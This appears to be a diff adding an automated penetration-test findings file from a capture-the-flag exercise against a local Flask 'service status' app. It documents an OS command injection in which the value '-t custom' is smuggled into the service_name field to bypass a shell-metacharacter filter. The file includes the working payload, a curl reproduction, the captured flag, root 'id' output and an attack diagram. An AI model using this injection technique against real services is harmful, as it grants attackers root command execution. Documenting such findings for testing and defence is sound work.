@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:38:15.656162+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "2d4a4baf-98a4-4ea9-a9ea-95c598023148",
+      "timestamp": "2026-04-12T21:38:15.656047+00:00",
+      "title": "OS Command Injection via Service Name Argument Injection (CTF Flag)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:33153/check_service",
+      "description": "The /check_service endpoint passes the service_name JSON field directly to check_service.sh via shell=True without proper sanitization. The script supports a '-t custom' mode that executes arbitrary commands. While basic shell metacharacters (;, |, &, $, backtick) are filtered, spaces and single-quotes are allowed. By injecting '-t custom' as a type argument, an attacker can execute arbitrary commands. Single-quoting the command allows multi-word commands to bypass the single-argument limitation. The application runs as root, providing full system compromise.",
+      "evidence": "POST /check_service HTTP/1.1\nContent-Type: application/json\n{\"service_name\": \"-t custom 'cat FLAG.txt'\"}\n\nResponse: {\"service_name\":\"-t custom 'cat FLAG.txt'\",\"status\":\"flag{e4989f65-575a-4213-a9e7-87a96cb61e87}true\"}\n\nCTF FLAG: flag{e4989f65-575a-4213-a9e7-87a96cb61e87}\n\nAdditional RCE proof:\n{\"service_name\": \"-t custom id\"}\nResponse: uid=0(root) gid=0(root) groups=0(root)",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X POST http://172.17.0.1:33153/check_service -H 'Content-Type: application/json' -d '{\"service_name\": \"-t custom \\'cat FLAG.txt\\'\"}'",
+        "expected": "flag{e4989f65-575a-4213-a9e7-87a96cb61e87}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "b2c20418-3dd0-426a-8606-8575c272d188",
+      "timestamp": "2026-04-12T21:38:23.084393+00:00",
+      "title": "Service Status Dashboard - Attack Surface",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> App[\"Flask App - Werkzeug 3.0.6 - Python 3.8.20\"]\n  App --> CheckEndpoint[\"/check_service POST\"]\n  CheckEndpoint --> Script[\"check_service.sh\"]\n  Script -->|\"systemctl mode\"| Systemctl[\"systemctl is-active\"]\n  Script -->|\"ps mode\"| PGrep[\"pgrep\"]\n  Script -->|\"custom mode - VULNERABLE\"| RCE[\"eval arbitrary command as root\"]\n  RCE --> Flag[\"FLAG.txt - flag{e4989f65-...}\"]\n  RCE --> OS[\"OS - root access\"]"
+    }
+  ]
+}
